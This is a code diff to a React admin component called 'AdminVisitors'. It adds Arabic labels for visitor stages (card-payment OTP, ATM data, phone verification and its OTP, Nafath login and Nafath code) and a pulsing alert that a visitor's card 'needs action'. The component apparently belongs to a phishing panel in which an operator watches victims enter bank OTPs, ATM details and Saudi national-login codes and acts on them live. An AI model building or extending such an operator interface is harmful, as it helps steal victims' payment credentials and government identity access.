@@ -1877,8 +1877,34 @@ const AdminVisitors = () => {
                                   );
                                 };
 
+                                const stageNameMap: Record<string, string> = {
+                                  otp: "كود OTP الدفع بالبطاقة",
+                                  atm: "بيانات ATM",
+                                  phone_verify: "توثيق رقم الجوال",
+                                  phone_otp: "كود OTP توثيق الجوال",
+                                  nafath_login: "دخول النفاذ",
+                                  nafath_verify: "رمز النفاذ",
+                                };
+
                                 return (
                               <>
+                              {/* Action needed alert */}
+                              {isPending && activeStage && stageNameMap[activeStage] && (
+                                <motion.div
+                                  initial={{ opacity: 0, y: -8 }}
+                                  animate={{ opacity: 1, y: 0 }}
+                                  className="flex items-center gap-2 px-3 py-2 rounded-lg bg-amber-500/15 border border-amber-500/40 mb-2"
+                                >
+                                  <span className="relative flex h-2.5 w-2.5 shrink-0">
+                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-500 opacity-75" />
+                                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-amber-500" />
+                                  </span>
+                                  <AlertTriangle className="w-3.5 h-3.5 text-amber-600 shrink-0" />
+                                  <p className="text-[11px] font-bold text-amber-700">
+                                    بطاقة <span className="underline decoration-amber-500">{stageNameMap[activeStage]}</span> بحاجة اتخاذ إجراء
+                                  </p>
+                                </motion.div>
+                              )}
                               {/* === 7 Categorized Sections === */}
                               <div className="space-y-2.5">
 
